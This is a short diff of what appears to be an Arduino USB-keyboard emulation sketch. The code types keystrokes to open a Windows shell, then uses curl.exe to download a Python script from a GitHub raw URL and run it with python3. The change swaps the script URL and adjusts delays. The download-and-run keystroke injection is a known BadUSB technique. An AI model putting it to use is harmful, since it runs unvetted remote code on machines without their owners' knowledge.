@@ -660,8 +660,8 @@ void start() {
             delay(500);
             Keyboard.print("x");
             delay(500);
-            Keyboard.println("curl.exe --output %homedrive%%HOMEPATH%/script.py --url https://raw.githubusercontent.com/martinhofigueiredo/SSR/main/cubed/imagebuilder.py"); //CURL SCRIPT FROM GIT hub
-            delay(1000);
+            Keyboard.println("curl.exe --output %homedrive%%HOMEPATH%/script.py --url https://raw.githubusercontent.com/martinhofigueiredo/SSR/main/gitraw.py"); //CURL SCRIPT FROM GIT hub
+            delay(2000);
             Keyboard.pressRaw(0xe3); // Left GUI
             Keyboard.pressRaw(0x1B); // Left GUI
             delay(500);
@@ -673,7 +673,9 @@ void start() {
             delay(500);
             Keyboard.print("x");
             delay(500);
-            Keyboard.println("python3 %homedrive%%HOMEPATH%/script.py"); //CURL SCRIPT FROM GIT hub
+            Keyboard.println("python3 -i %homedrive%%HOMEPATH%/script.py"); //CURL SCRIPT FROM GIT hub
+            delay(2000);
+            
             
         }
         else {
